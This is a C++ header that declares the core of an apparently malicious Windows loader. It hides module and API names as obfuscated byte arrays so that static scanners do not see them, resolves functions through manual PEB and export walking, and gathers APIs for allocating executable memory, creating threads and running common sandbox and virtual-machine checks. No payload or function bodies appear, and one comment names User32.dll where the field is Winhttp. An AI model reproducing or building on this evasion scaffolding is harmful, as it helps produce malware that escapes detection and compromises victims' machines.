#pragma once
#include <Windows.h>
#include <winternl.h>
#include <vector>
#include "string.h"
#include "obfuscation.h"


typedef struct MODULELIST_ {
    LPVOID KERNEL32;
    LPVOID Winhttp;
}MODULELIST, * PMODULELIST;

// obfuscated names separated by ff
typedef struct MODULESTRING_ {
    std::vector<BYTE> names = { 0x67, 0x6e, 0x4c, 0x73, 0x41, 0x5a, 0x44, 0x5b, 0x53, 0x57, 0x4c, 0x77, 0x51, 0x57, 0x54, 0x45, 0x5d, 0x17, 0x16, 0x4c, 0x7f, 0x65, \
        0x76, 0x7a, 0x65, 0x7c, 0x17, 0x16, 0x1a, 0x44, 0x5c, 0x5c, 0xff, //KERNEL32.dll
        0x67, 0x6e, 0x4c, 0x73, 0x41, 0x5a, 0x44, 0x5b, 0x53, 0x57, 0x4c, 0x77, 0x51, 0x57, 0x54, 0x45, 0x5d, 0x17, 0x16, 0x4c, 0x75, 0x57, \
        0x45, 0x56, 0x17, 0x16, 0x1a, 0x44, 0x5c, 0x5c, 0xff, //User32.dll
    };
}MODULESTRING, * PMODULESTRING;


typedef struct API_ {
    LPVOID LoadLibraryA;
    LPVOID CloseHandle;
    LPVOID GlobalMemoryStatusEx;
    LPVOID CreateToolhelp32Snapshot;
    LPVOID Process32NextW;
    LPVOID Process32FirstW;
    LPVOID Sleep;
    LPVOID GlobalFree;
    LPVOID VirtualProtect;
    LPVOID VirtualAlloc;
    LPVOID CreateThread;
    LPVOID WaitForSingleObject;
    LPVOID VirtualFree;
    LPVOID GetSystemInfo;
    LPVOID GetSystemMetrics;
    LPVOID GetComputerNameA;
    LPVOID GetTickCount64;
    LPVOID RtlAddFunctionTable;
    LPVOID GetProcAddress;
    LPVOID GetModuleHandleA;
}
API, * PAPI;

// Obfuscated names separated by 0x99
typedef struct APISTRING_ {
    std::vector<BYTE> names = { 0x7c, 0x5b, 0x49, 0x44, 0x7c, 0x41, 0x46, 0x56, 0x49, 0x56, 0x51, 0x69, 0x99, //LoadLibraryA
        0x67, 0x5c, 0x5b, 0x57, 0x45, 0x60, 0x49, 0x5a, 0x44, 0x5c, 0x45, 0x99, // CloseHandle
        0x63, 0x5c, 0x5b, 0x46, 0x49, 0x5c, 0x7d, 0x45, 0x5d, 0x5b, 0x56, 0x51, 0x77, 0x54, 0x49, 0x54, 0x55, 0x57, 0x65, 0x50, 0x99, //GlobalMemoryStatusEx
        0x67, 0x56, 0x45, 0x49, 0x54, 0x45, 0x74, 0x5b, 0x5b, 0x5c, 0x40, 0x45, 0x5c, 0x58, 0x17, 0x16, 0x77, 0x5a, 0x49, 0x58, 0x57, 0x40, 0x5b, 0x54, 0x99, //CreateToolHelp32Snapshot
        0x78, 0x56, 0x5b, 0x47, 0x45, 0x57, 0x57, 0x17, 0x16, 0x7a, 0x45, 0x50, 0x54, 0x73, 0x99, //Process32NextW
        0x78, 0x56, 0x5b, 0x47, 0x45, 0x57, 0x57, 0x17, 0x16, 0x62, 0x41, 0x56, 0x57, 0x54, 0x73, 0x99, //Process32FirstW
        0x77, 0x5c, 0x45, 0x45, 0x58, 0x99, //Sleep
        0x63, 0x5c, 0x5b, 0x46, 0x49, 0x5c, 0x62, 0x56, 0x45, 0x45, 0x99, //GlobalFree
        0x72, 0x41, 0x56, 0x54, 0x55, 0x49, 0x5c, 0x78, 0x56, 0x5b, 0x54, 0x45, 0x47, 0x54, 0x99, //VirtualProtect
        0x72, 0x41, 0x56, 0x54, 0x55, 0x49, 0x5c, 0x69, 0x5c, 0x5c, 0x5b, 0x47, 0x99, //VirtualAlloc
        0x67, 0x56, 0x45, 0x49, 0x54, 0x45, 0x74, 0x40, 0x56, 0x45, 0x49, 0x44, 0x99, //CreateThread
        0x73, 0x49, 0x41, 0x54, 0x62, 0x5b, 0x56, 0x77, 0x41, 0x5a, 0x43, 0x5c, 0x45, 0x7b, 0x46, 0x5e, 0x45, 0x47, 0x54, 0x99, //WaitForSingleObject
        0x72, 0x41, 0x56, 0x54, 0x55, 0x49, 0x5c, 0x62, 0x56, 0x45, 0x45, 0x99, // VirtualFree
        0x63, 0x45, 0x54, 0x77, 0x51, 0x57, 0x54, 0x45, 0x5d, 0x61, 0x5a, 0x42, 0x5b, 0x99, //GetSystemInfo
        0x63, 0x45, 0x54, 0x77, 0x51, 0x57, 0x54, 0x45, 0x5d, 0x7d, 0x45, 0x54, 0x56, 0x41, 0x47, 0x57, 0x99, //GetSystemMetrics
        0x63, 0x45, 0x54, 0x67, 0x5b, 0x5d, 0x58, 0x55, 0x54, 0x45, 0x56, 0x7a, 0x49, 0x5d, 0x45, 0x69, 0x99, // GetComputerNameA
        0x63, 0x45, 0x54, 0x74, 0x41, 0x47, 0x5f, 0x67, 0x5b, 0x55, 0x5a, 0x54, 0x12, 0x14, 0x99, //GetTickCount64
        0x76, 0x54, 0x5c, 0x69, 0x44, 0x44, 0x62, 0x55, 0x5a, 0x47, 0x54, 0x41, 0x5b, 0x5a, 0x74, 0x49, 0x46, 0x5c, 0x45, 0x99, //RtlAddFunctionTable
        0x63, 0x45, 0x54, 0x78, 0x56, 0x5b, 0x47, 0x69, 0x44, 0x44, 0x56, 0x45, 0x57, 0x57, 0x99, //GetProcAdress
        0x63, 0x45, 0x54, 0x7d, 0x5b, 0x44, 0x55, 0x5c, 0x45, 0x60, 0x49, 0x5a, 0x44, 0x5c, 0x45, 0x69, 0x99, //GetModuleHandleA
    };
}APISTRING, * PAPISTRING;


PEB* GetPEB();
LPVOID GetModule(wchar_t* modName);
void* GetSymbolAddress(uintptr_t baseAddress, LPCSTR lpProcName);
void initAPIStruct(PAPISTRING apistring, PAPI api, LPVOID modbase);
void initModList(PMODULESTRING modstring, PMODULELIST modlist, PAPISTRING apistring, PAPI api);
